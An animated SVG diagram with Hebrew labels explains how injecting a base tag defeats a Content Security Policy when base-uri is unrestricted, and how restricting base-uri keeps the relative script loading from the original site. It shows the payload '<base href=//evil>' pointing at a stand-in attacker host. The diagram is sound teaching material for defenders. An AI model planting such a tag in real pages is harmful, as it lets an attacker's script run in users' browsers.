<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 680 428" width="680" role="img" aria-label="עקיפת CSP דרך תגית base: כשאין הגבלת base-uri, סקריפט יחסי נטען משרת התוקף, ובעזרת base-uri none הוא נטען מהאתר המקורי">
<style>
svg{--ink:#0a1628;--card:#ffffff;--chip:#eef1f6;--border:#c3cddc;--accent:#4361ee;--accent-tint:#eef1fe;--pink:#e0175d;--edge:#64748b;--muted:#718096;}
@media (prefers-color-scheme: dark){svg{--ink:#edf3fc;--card:#0e1f38;--chip:#152a49;--border:#385582;--accent:#7b90f5;--accent-tint:#1a2c55;--pink:#ff5c93;--edge:#8296b3;--muted:#8296b3;}}
.n-box{fill:var(--card);stroke:var(--border);stroke-width:1.5;}
.n-dia{fill:var(--accent-tint);stroke:var(--accent);stroke-width:1.5;}
.n-hl{fill:var(--card);stroke:var(--pink);stroke-width:2;}
.n-cell{fill:var(--card);stroke:var(--border);stroke-width:1.2;}
.n-code-bg{fill:var(--chip);stroke:var(--border);stroke-width:1.2;}
.t{font-family:'Heebo','Segoe UI',system-ui,sans-serif;font-size:15px;font-weight:500;fill:var(--ink);direction:rtl;}
.t-b{font-family:'Heebo','Segoe UI',system-ui,sans-serif;font-size:16px;font-weight:700;fill:var(--ink);direction:rtl;}
.code{font-family:ui-monospace,'SF Mono',Menlo,monospace;font-size:13px;fill:var(--ink);direction:ltr;}
.lbl{font-family:'Heebo','Segoe UI',system-ui,sans-serif;font-size:13px;font-weight:600;fill:var(--accent);direction:rtl;}
.small{font-family:'Heebo','Segoe UI',system-ui,sans-serif;font-size:12px;fill:var(--muted);direction:rtl;}
.idx{font-family:ui-monospace,'SF Mono',Menlo,monospace;font-size:12px;fill:var(--muted);}
.edge{stroke:var(--edge);stroke-width:1.6;fill:none;}
.arrhead{fill:var(--edge);}
@media (prefers-reduced-motion: reduce){*{animation:none !important;}}
@keyframes k-rel{0.00%{stroke:var(--pink);stroke-width:2.5;}14.41%{stroke:var(--pink);stroke-width:2.5;}17.37%{stroke-width:1.5;}100.00%{stroke-width:1.5;}}
#el-rel .shp{animation-name:k-rel;animation-duration:11.80s;animation-iteration-count:infinite;animation-timing-function:linear;}
@keyframes k-basetag{0.00%{stroke-width:1.5;}11.44%{stroke-width:1.5;}14.41%{stroke:var(--pink);stroke-width:2.5;}28.81%{stroke:var(--pink);stroke-width:2.5;}31.78%{stroke-width:1.5;}100.00%{stroke-width:1.5;}}
#el-basetag .shp{animation-name:k-basetag;animation-duration:11.80s;animation-iteration-count:infinite;animation-timing-function:linear;}
@keyframes k-baseq{0.00%{stroke-width:1.5;}25.85%{stroke-width:1.5;}28.81%{stroke:var(--pink);stroke-width:2.5;}43.22%{stroke:var(--pink);stroke-width:2.5;}46.19%{stroke-width:1.5;}54.66%{stroke-width:1.5;}57.63%{stroke:var(--pink);stroke-width:2.5;}72.03%{stroke:var(--pink);stroke-width:2.5;}75.00%{stroke-width:1.5;}100.00%{stroke-width:1.5;}}
#el-baseq .shp{animation-name:k-baseq;animation-duration:11.80s;animation-iteration-count:infinite;animation-timing-function:linear;}
@keyframes k-safe{0.00%{stroke-width:1.5;}40.25%{stroke-width:1.5;}43.22%{stroke:var(--pink);stroke-width:2.5;}57.63%{stroke:var(--pink);stroke-width:2.5;}60.59%{stroke-width:1.5;}100.00%{stroke-width:1.5;}}
#el-safe .shp{animation-name:k-safe;animation-duration:11.80s;animation-iteration-count:infinite;animation-timing-function:linear;}
@keyframes k-attacker{0.00%{stroke-width:1.5;}69.07%{stroke-width:1.5;}72.03%{stroke:var(--pink);stroke-width:2.5;}86.44%{stroke:var(--pink);stroke-width:2.5;}100.00%{stroke:var(--pink);stroke-width:2.5;}}
#el-attacker .shp{animation-name:k-attacker;animation-duration:11.80s;animation-iteration-count:infinite;animation-timing-function:linear;}
@keyframes k-edge-0{0.00%{stroke-width:1.6;}11.44%{stroke-width:1.6;}14.41%{stroke:var(--pink);stroke-width:2.4;}28.81%{stroke:var(--pink);stroke-width:2.4;}31.78%{stroke-width:1.6;}100.00%{stroke-width:1.6;}}
#edge-0{animation-name:k-edge-0;animation-duration:11.80s;animation-iteration-count:infinite;animation-timing-function:linear;}
@keyframes k-edge-1{0.00%{stroke-width:1.6;}25.85%{stroke-width:1.6;}28.81%{stroke:var(--pink);stroke-width:2.4;}43.22%{stroke:var(--pink);stroke-width:2.4;}46.19%{stroke-width:1.6;}100.00%{stroke-width:1.6;}}
#edge-1{animation-name:k-edge-1;animation-duration:11.80s;animation-iteration-count:infinite;animation-timing-function:linear;}
@keyframes k-edge-3{0.00%{stroke-width:1.6;}40.25%{stroke-width:1.6;}43.22%{stroke:var(--pink);stroke-width:2.4;}57.63%{stroke:var(--pink);stroke-width:2.4;}60.59%{stroke-width:1.6;}100.00%{stroke-width:1.6;}}
#edge-3{animation-name:k-edge-3;animation-duration:11.80s;animation-iteration-count:infinite;animation-timing-function:linear;}
@keyframes k-edge-2{0.00%{stroke-width:1.6;}69.07%{stroke-width:1.6;}72.03%{stroke:var(--pink);stroke-width:2.4;}86.44%{stroke:var(--pink);stroke-width:2.4;}100.00%{stroke:var(--pink);stroke-width:2.4;}}
#edge-2{animation-name:k-edge-2;animation-duration:11.80s;animation-iteration-count:infinite;animation-timing-function:linear;}
</style>
<defs><marker id="arr" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" class="arrhead"/></marker></defs>
<polyline id="edge-0" class="edge" points="170.5,54.0 170.5,94.0" marker-end="url(#arr)"/>
<text class="lbl" x="184.5" y="78.0" text-anchor="end">התוקף מזריק</text>
<polyline id="edge-1" class="edge" points="170.5,132.0 170.5,172.0" marker-end="url(#arr)"/>
<polyline id="edge-2" class="edge" points="170.5,326.5 170.5,366.5" marker-end="url(#arr)"/>
<text class="lbl" x="184.5" y="350.5" text-anchor="end">לא</text>
<polyline id="edge-3" class="edge" points="325.0,249.2 391.0,249.2" marker-end="url(#arr)"/>
<text class="lbl" x="358.0" y="237.2" text-anchor="middle">כן</text>
<g id="el-rel">
<rect class="n-code-bg shp" x="62.2" y="16.0" width="216.5" height="38.0" rx="7"/>
<text class="code" x="170.5" y="43.0" text-anchor="middle">&lt;script src=/app.js&gt;</text>
</g>
<g id="el-basetag">
<rect class="n-code-bg shp" x="71.2" y="94.0" width="198.5" height="38.0" rx="7"/>
<text class="code" x="170.5" y="121.0" text-anchor="middle">&lt;base href=//evil&gt;</text>
</g>
<g id="el-baseq">
<polygon class="n-dia shp" points="170.5,172.0 325.0,249.2 170.5,326.5 16.0,249.2"/>
<text class="t" x="170.5" y="254.2" text-anchor="middle">ה-base-uri מוגבל?</text>
</g>
<g id="el-attacker">
<rect class="n-box shp" x="43.5" y="366.5" width="254.0" height="46.0" rx="8"/>
<text class="t" x="170.5" y="394.5" text-anchor="middle">הסקריפט נטען משרת התוקף</text>
</g>
<g id="el-safe">
<rect class="n-box shp" x="391.0" y="226.2" width="273.5" height="46.0" rx="8"/>
<text class="t" x="527.7" y="254.2" text-anchor="middle">הסקריפט נטען מהאתר המקורי</text>
</g>
</svg>
